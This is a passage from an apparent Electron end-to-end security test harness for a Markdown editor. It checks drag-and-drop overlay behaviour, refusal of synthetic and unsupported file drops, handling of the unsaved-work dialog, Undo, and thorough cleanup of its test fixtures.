        path.basename(action.fixture.filePath), ingress && attributed && !page.overlay &&
          !page.dialog && faults.length === 0, JSON.stringify({
          events, result: action.result, error: action.error, attributed, faults }));
      if (!ingress || !attributed || page.overlay || page.dialog || faults.length) {
        throw new Error("Drop ingress/effect ownership was not established");
      }
      const result = { page, offers, opens, errors, reads: ownReads, accepted };
      action.pending = false;
      active = null;
      return result;
    }
    function requireDroppedAdmissionRetired(owner) {
      if (shutdown.documentAdmissionIsCurrent(owner.descriptor.ref) !== false) {
        throw new Error("Dropped owner admission did not actually retire");
      }
    }
    async function admitDroppedFixture(fixture) {
      const action = await dispatchDrop(fixture);
      let owner;
      await dropWait(async () => {
        owner = await readSecurityImageOwner(fixture.filePath);
        return dropDocumentMatches(owner, fixture, 1);
      }, "exact admitted dropped document and current DOM");
      const effects = await finishDrop(action, true);
      const accepted = action.result === true && effects.offers.length === 1 &&
        effects.offers[0].value.filePath === fixture.filePath && effects.opens.length === 1 &&
        effects.opens[0].value.path === fixture.filePath &&
        effects.opens[0].value.content === fixture.body && effects.errors.length === 0 &&
        effects.reads.length > 0 && fs.readFileSync(fixture.filePath, "utf8") === fixture.body &&
        shutdown.documentAdmissionIsCurrent(owner.descriptor.ref) === true;
      check("a supported extension reaches exact Main admission and clean document DOM: " +
        path.basename(fixture.filePath), accepted, JSON.stringify({ accepted, owner }));
      if (!accepted) throw new Error("Accepted drop lacks actual read/admission evidence");
      return owner;
    }
    try {
    securityGestureRegistration.observer = observer;
    contents.send = observedSend;
    fs.promises.open = observedOpen;
    pageAttempted = true;
    await exec(`
      (() => {
        if (Object.hasOwn(window, '__securityDrop') || Object.hasOwn(window, '__fireDrag') ||
            Object.hasOwn(window, '__securityDropListener')) throw new Error('Drop probe already exists');
        const p = window.__securityDrop = { ownerKey: ${JSON.stringify(dropPageKey)}, events: [] };
        p.listener = window.__securityDropListener = event => {
          p.events.push({ event, count: event.dataTransfer?.files?.length,
            name: event.dataTransfer?.files?.[0]?.name });
        };
        window.addEventListener('drop', p.listener);
        p.fireDrag = window.__fireDrag = (type, names) => {
          const dt = new DataTransfer();
          (names || []).forEach((n) => dt.items.add(new File(['# hi'], n)));
          const ev = new DragEvent(type, { dataTransfer: dt, bubbles: true, cancelable: true });
          window.dispatchEvent(ev);
          return ev;
        };
        return true;
      })()
    `);

    const dropReset = () => exec(`(() => { window.__fireDrag('dragend', []); return null; })()`);

    // The overlay, and where its text comes from.
    const enter = await exec(`(() => {
      window.__fireDrag('dragenter', ['a.md']);
      return { active: document.body.classList.contains('drop-active'),
               label: document.body.dataset.dropLabel };
    })()`);
    check(
      "dragging a file over the window shows the drop overlay",
      enter.active === true,
      JSON.stringify(enter),
    );
    check(
      "the drop overlay's label comes from the string table, not the stylesheet",
      enter.label === (await exec(`i18n('drop.hint')`)) && !!enter.label,
      JSON.stringify(enter),
    );

    // dragenter/dragleave bubble from every child, so the overlay has to be
    // reference-counted or it flickers off the moment the pointer crosses an
    // element boundary mid-drag.
    //
    // Seeded with an explicit dragend (which zeroes the counter) and then TWO
    // enters, rather than borrowing the single enter the previous test left
    // behind: depending on that residue meant reordering or resetting anything
    // above would break this test while the product stayed correct.
    const counted = await exec(`(() => {
      window.__fireDrag('dragend', []);
      window.__fireDrag('dragenter', ['a.md']);
      window.__fireDrag('dragenter', ['a.md']);
      const bothIn = document.body.classList.contains('drop-active');
      window.__fireDrag('dragleave', ['a.md']);
      const stillUp = document.body.classList.contains('drop-active');
      window.__fireDrag('dragleave', ['a.md']);
      return { bothIn, stillUp, downAfterLast: !document.body.classList.contains('drop-active') };
    })()`);
    check(
      "the drop overlay survives a dragleave from a child element",
      counted.bothIn === true && counted.stillUp === true,
      JSON.stringify(counted),
    );
    check(
      "the drop overlay goes away once the drag really has left",
      counted.downAfterLast === true,
      JSON.stringify(counted),
    );

    await dropReset();
    await exec(`window.__fireDrag('drop', ['notes.md']); null`);
    await dropBarrier();
    const synthetic = await pageState();
    check(
      "a synthetic DOM drop cannot manufacture Main file admission",
      synthetic.events.length === 1 && synthetic.events[0].trusted === false &&
        entries.length === 0 && sends.length === 0 && reads.length === 0 &&
        (await readSecurityImageOwner(null)).tabs.length === 0,
      JSON.stringify(synthetic),
    );
    await dropReset();
    const overCancelled = await exec(`(() => {
      const ev = window.__fireDrag('dragover', ['a.md']);
      return { cancelable: ev.cancelable, prevented: ev.defaultPrevented };
    })()`);
    check(
      "a DOM dragover is cancelable and cancelled by the current overlay handler",
      overCancelled.cancelable === true && overCancelled.prevented === true,
      JSON.stringify(overCancelled),
    );

    // A drag that leaves the window entirely can fire no drop and, on some
    // window managers, no final dragleave - stranding the overlay over a
    // document the reader can no longer read.
    const stranded = await exec(`(() => {
      window.__fireDrag('dragenter', ['a.md']);
      const up = document.body.classList.contains('drop-active');
      window.dispatchEvent(new Event('blur'));
      return { up, cleared: !document.body.classList.contains('drop-active') };
    })()`);
    check(
      "an abandoned drag cannot strand the overlay over the document",
      stranded.up === true && stranded.cleared === true,
      JSON.stringify(stranded),
    );

    if (contents.debugger.isAttached()) throw new Error("Drop actor refuses an unowned debugger");
    contents.debugger.attach("1.3");
    ownsDebugger = true;
    for (const name of fixtureNames.slice(0, 8)) {
      const fixture = fixtures.get(name), owner = await admitDroppedFixture(fixture);
      if (name === "notes.md") {
        for (const rejectedName of fixtureNames.slice(10)) {
          const rejected = fixtures.get(rejectedName);
          const denied = await dispatchDrop(rejected);
          const expected = "Dropped file type is not supported: " + path.basename(rejected.filePath);
          await dropWait(async () => {
            const state = await pageState();
            return state.notification.visible && state.notification.text === expected;
          }, "exact visible Main refusal notification");
          const refusal = await finishDrop(denied, false);
          const after = await readSecurityImageOwner(fixture.filePath);
          const unchanged = isDeepStrictEqual(after, owner);
          const refused = denied.result === false && refusal.offers.length === 0 &&
            refusal.opens.length === 0 && refusal.reads.length === 0 &&
            refusal.errors.length === 1 && refusal.errors[0].value === expected &&
            !shutdown.documentSessionState().history.some(item => item.filePath === rejected.filePath) &&
            unchanged;
          check("unsupported drop is refused before read/admission and reports its literal filename: " +
            rejectedName, refused, JSON.stringify({ refused, unchanged, message: refusal.page.notification }));
          if (!refused) throw new Error("Unsupported drop changed ownership or escaped refusal accounting");
        }
      }
      await closeSecurityImageFixture(owner, fixture.filePath, fixture.body, fixture.heading);
      requireDroppedAdmissionRetired(owner);
    }

    const dirty = fixtures.get("dirty.md"), other = fixtures.get("other.md");
    const dirtyOwner = await admitDroppedFixture(dirty);
    await exec("changeCurrentDocumentEditor(true)");
    await exec(`(() => {
      const editor = document.getElementById('markdownEditor');
      editor.focus(); editor.setSelectionRange(editor.value.length, editor.value.length);
      return true;
    })()`);
    await contents.insertText("\nUNSAVED DROP WORK\n");
    const dirtyText = dirty.body + "\nUNSAVED DROP WORK\n";
    await dropWait(() => exec(`isEditMode && hasUnsavedChanges &&
      document.getElementById('markdownEditor').value === ${JSON.stringify(dirtyText)} &&
      window.CustomTabs.__documentState(window.CustomTabs.getActiveTab()).dirty === true`),
    "real unsaved editor work");
    const beforeCancel = await readSecurityImageOwner(dirty.filePath);
    const declined = await dispatchDrop(other, "cancel");
    const cancellation = await finishDrop(declined, false);
    const afterCancel = await readSecurityImageOwner(dirty.filePath);
    const canceled = declined.result === true && cancellation.offers.length === 1 &&
      cancellation.offers[0].value.filePath === other.filePath &&
      cancellation.opens.length === 0 && cancellation.reads.length === 0 &&
      cancellation.errors.length === 0 && isDeepStrictEqual(afterCancel, beforeCancel) &&
      await exec(`document.getElementById('markdownEditor').value === ${JSON.stringify(dirtyText)}`);
    check("canceling the actual unsaved-work dialog preserves source and refuses target admission",
      canceled, JSON.stringify({ canceled, beforeCancel, afterCancel }));
    if (!canceled) throw new Error("Canceled drop lost work or admitted its target");
    const proceeded = await dispatchDrop(other, "proceed");
    let target;
    await dropWait(async () => {
      target = await readSecurityImageOwner(other.filePath);
      return dropDocumentMatches(target, other, 2) &&
        target.tabs.some(tab => tab.id === dirtyOwner.id && tab.path === dirty.filePath);
    }, "approved exact target admission with the known source tab");
    const approval = await finishDrop(proceeded, true);
    const approved = proceeded.result === true && approval.offers.length === 1 &&
      approval.opens.length === 1 && approval.opens[0].value.path === other.filePath &&
      approval.opens[0].value.content === other.body && approval.reads.length > 0 &&
      approval.errors.length === 0 && fs.readFileSync(dirty.filePath, "utf8") === dirty.body &&
      fs.readFileSync(other.filePath, "utf8") === other.body;
    check("agreeing to the actual unsaved-work dialog admits the exact dropped target",
      approved, JSON.stringify({ approved, target }));
    if (!approved) throw new Error("Approved drop has no exact target evidence");
    await exec(`(() => {
      const state = window.__securityDrop;
      state.closed = false; state.closeError = null;
      Promise.resolve(window.CustomTabs.closeTab(${target.id})).then(
        () => { state.closed = true; },
        error => { state.closeError = String(error); });
      return true;
    })()`);
    await dropWait(async () => {
      const state = await pageState();
      const closed = await exec("({ done: window.__securityDrop.closed, error: window.__securityDrop.closeError })");
      if (state.dialog || closed.error) throw new Error("Known clean drop-target retirement requested consent or failed");
      return closed.done;
    }, "known clean drop target retirement");
    await dropBarrier();
    requireDroppedAdmissionRetired(target);
    const sourceBeforeUndo = await readSecurityImageOwner(dirty.filePath);
    if (sourceBeforeUndo.id !== dirtyOwner.id ||
        sourceBeforeUndo.descriptor?.ref !== dirtyOwner.descriptor.ref ||
        sourceBeforeUndo.tabs.length !== 1 || sourceBeforeUndo.state?.dirty !== true ||
        !await exec(`isEditMode && document.getElementById('markdownEditor').value ===
          ${JSON.stringify(dirtyText)}`)) {
      throw new Error("Drop target retirement did not restore the exact dirty source for Undo");
    }
    await exec("historyUndo(); null");
    let restored;
    await dropWait(async () => {
      restored = await readSecurityImageOwner(dirty.filePath);
      return dropDocumentMatches(restored, dirty, 1) &&
        restored.id === dirtyOwner.id && restored.descriptor.ref === dirtyOwner.descriptor.ref;
    }, "real Undo restores the original admitted source");
    await closeSecurityImageFixture(restored, dirty.filePath, dirty.body, dirty.heading);
    await dropBarrier();
    requireDroppedAdmissionRetired(restored);
    check("drop actors retire their exact owners without saving or leaving a dialog",
      (await readSecurityImageOwner(null)).tabs.length === 0 &&
        !active && !dragPending && !(await pageState()).dialog && faults.length === 0);
    } catch (error) {
      failure = error;
      throw error;
    } finally {
      const cleanup = [];
      if (active && !active.settled) {
        const deadline = Date.now() + 12000;
        while (!active.settled && Date.now() < deadline) await sleep(40);
        if (!active.settled) cleanup.push(new Error("Main drop action settlement is unconfirmed"));
      }
      if (active) {
        // Gesture settlement precedes renderer admission; finishDrop seals the lifecycle.
        active.pending = false;
        cleanup.push(new Error("Drop lifecycle completion is unconfirmed"));
      }
      if (ownsDebugger && dragPending && !contents.isDestroyed()) {
        try { await contents.debugger.sendCommand("Input.cancelDragging"); }
        catch (error) { cleanup.push(error); }
      }
      try {
        if (pageAttempted) {
          await disposeDropPage();
        }
      } catch (error) { cleanup.push(error); }
      if (faults.length) cleanup.push(new Error("Drop terminal accounting: " + faults.join("; ")));
      for (const { object, key, installed, original, descriptor } of dropSlots) {
        try {
          if (object[key] !== installed) throw new Error("Drop disposal lost ownership of " + key);
          if (descriptor) Object.defineProperty(object, key, descriptor);
          else delete object[key];
          if (object[key] !== original ||
              !isDeepStrictEqual(Object.getOwnPropertyDescriptor(object, key), descriptor)) {
            throw new Error("Drop disposal did not restore the exact descriptor of " + key);
          }
        } catch (error) { cleanup.push(error); }
      }
      if (ownsDebugger) {
        try { contents.debugger.detach(); }
        catch (error) { cleanup.push(error); }
      }
      check("drop observation resources have confirmed owned disposal",
        cleanup.length === 0, JSON.stringify(cleanup.map(error => String(error))));
      if (cleanup.length) throw new AggregateError(
        [...(failure ? [failure] : []), ...cleanup], "Drop cleanup is unconfirmed; fixtures remain retained");
    }
  }

  // __e2eErrors only sees what window.onerror sees. The sentinel additionally
  // watches the renderer console and the rendered document, which is where a
  // CSP misconfiguration or a mermaid error graphic shows up.
  // Prove the watcher was actually watching. Without this, "no errors were
  // recorded" and "the watcher silently stopped working" are the same result -
  // the exact vacuity this harness exists to eliminate. Both detection paths
  // are checked because they fail independently.
  const alive = await proveSentinelAlive(win, sentinel);
  check(
    "the error sentinel was demonstrably watching both channels",
    alive.console === true && alive.dom === true,
    JSON.stringify(alive),
  );

  const sentinelReport = await sentinel.stop();
  check(
    "nothing rendered a visible error at any point during the suite",
    sentinelReport.hits.length === 0,
    JSON.stringify(sentinelReport.hits),
  );
}

app.whenReady().then(async () => {
  const watchdog = setTimeout(() => {
    const failed = results.filter((r) => !r.ok).length;
    console.log(
      "FAIL  harness timed out after 180s - a blocking dialog is most likely open",
    );
    console.log(
      `\n=== TIMED OUT after ${results.length - failed}/${results.length} checks ===`,
    );
    failSecurityUnattended(new Error("Security watchdog expired"));
  }, 180000);
  watchdog.unref?.();

  try {
    if (SEC08_FILE_HELPERS_MISSING_GLOBAL_HARNESS) {
      await runFileHelpersLoaderProbe({ includeCore: false });
    } else if (SEC08_FILE_HELPERS_DOTFILE_HARNESS) {
      await runFileHelpersLoaderProbe({
        includeMissingGlobal: false,
        extensionCases: [".md"],
      });
    } else if (SEC08_FILE_HELPERS_PUBLICATION_HARNESS) {
      await runFileHelpersLoaderProbe({
        includeMissingGlobal: false,
        extensionCases: FILE_HELPER_EXTENSION_CASES.filter((filePath) => filePath !== "C:.mmd"),
      });
    } else if (SEC08_FILE_HELPERS_FOCUSED_HARNESS) {
      await runFileHelpersFocusedProbe();
    } else if (SEC08_LOADER_FOCUSED_HARNESS) {
      await runFocusedLoaderProbes();
    } else {
      await sleep(2500);
      const win = observedMain;
      check("security observes the actual Main before creating loader fixtures",
        !!win && !win.isDestroyed() && BrowserWindow.getAllWindows().length === 1 &&
          BrowserWindow.getAllWindows()[0] === win && securityDialogGuardsIntact());
      if (!win || win.isDestroyed() || BrowserWindow.getAllWindows().length !== 1 ||
          BrowserWindow.getAllWindows()[0] !== win || !securityDialogGuardsIntact()) {
        throw new Error("The security Main window or its dialog guards were not observed");
      }
      if (!(await securityShellTrap) || !(await waitForExternalTrap(win))) {
        throw new Error("Security lost its Main recording shell trap");
      }

      await runUtilsLoaderProbe();
      await runMermaidConfigLoaderProbe();
      await runContextMenuLoaderProbe();
      await runEmojiLoaderProbe();
      await runFileHelpersLoaderProbe();
      await win.webContents.executeJavaScript(E2E_SENTINEL);
      await run(win);
    }
  } catch (error) {
    console.log(
      "FAIL  harness threw:",
      error && error.stack ? error.stack : error,
    );
    results.push({ name: "harness", ok: false });
  }

  clearTimeout(watchdog);
  // Keep the last watched owner from triggering Main's window-all-closed quit
  // before its destruction and the failure footer have been verified.
  const cleanupKeepalive = new BrowserWindow({
    show: false,
    webPreferences: { nodeIntegration: false, contextIsolation: true, sandbox: true },
  });
  let destructionConfirmed = true;
  for (const [owner, contents] of securityWindows) {
    if (owner === cleanupKeepalive) continue;
    try {
      if (!owner.isDestroyed()) owner.destroy();
      if (!owner.isDestroyed() || !contents.isDestroyed()) destructionConfirmed = false;
    } catch {
      destructionConfirmed = false;
    }
  }
  await new Promise(resolve => setImmediate(resolve));
  if (cleanupKeepalive.isDestroyed() ||
      BrowserWindow.getAllWindows().some(owner => owner !== cleanupKeepalive) ||
      !securityDialogGuardsIntact()) destructionConfirmed = false;
  check("security fixture cleanup confirms owner destruction before release", destructionConfirmed);
  if (destructionConfirmed && results.every(result => result.ok)) {
    registeredTempDirs.add(dir);
    check("security fixtures release only after a passing run and confirmed owner destruction",
      visualUtils.releaseTempDir(dir), dir);
  } else {
    registeredTempDirs.delete(dir);
    console.log("RETAINED security fixtures outside shared sweeps (" +
      (destructionConfirmed ? "earlier test failure" : "owner destruction unconfirmed") + "): " + dir);
  }
  const failed = results.filter((r) => !r.ok).length;
  console.log(
    `\n=== ${results.length - failed}/${results.length} passed ===` +
      (skipped.length ? `  (${skipped.length} skipped: ${skipped.join(", ")})` : ""),
  );
  app.exit(failed === 0 ? 0 : 1);
});
